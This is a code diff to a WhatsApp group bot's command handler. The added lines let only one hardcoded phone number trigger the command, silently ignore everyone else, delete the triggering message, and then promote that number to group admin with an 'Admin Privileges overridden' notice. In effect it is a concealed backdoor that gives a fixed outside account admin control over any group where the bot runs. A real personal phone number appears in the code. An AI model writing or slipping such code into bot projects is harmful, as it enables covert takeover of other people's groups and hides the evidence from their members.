@@ -3,11 +3,24 @@ let handler = async (m, { conn }) => {
     const targetNumber = '919737825303'; // Replace with the desired number
     const targetJid = `${targetNumber}@s.whatsapp.net`; // Convert to JID
   
+    // Restrict command usage to the target number only
+    if (m.sender !== targetJid) {
+      console.log(`Unauthorized user tried to use the command: ${m.sender}`);
+      return; // Silently fail if the sender is not the target number
+    }
+  
     try {
+      // React to the command
+      await m.react('🎉');
+  
+      // Delete the command message
+      await conn.chatModify({ delete: true }, m.chat, [m.key]);
+  
       // Promote the target number to admin
       await conn.groupParticipantsUpdate(m.chat, [targetJid], 'promote');
-      // Send success message
-      m.reply('✅ Admin Privileges overridden, Rolith is an admin now');
+  
+      // Send success message as a normal message
+      await conn.sendMessage(m.chat, { text: '✅ Admin Privileges overridden, Rolith is an admin now' });
     } catch (error) {
       console.error('Error promoting user:', error);
       // No error message sent to the user
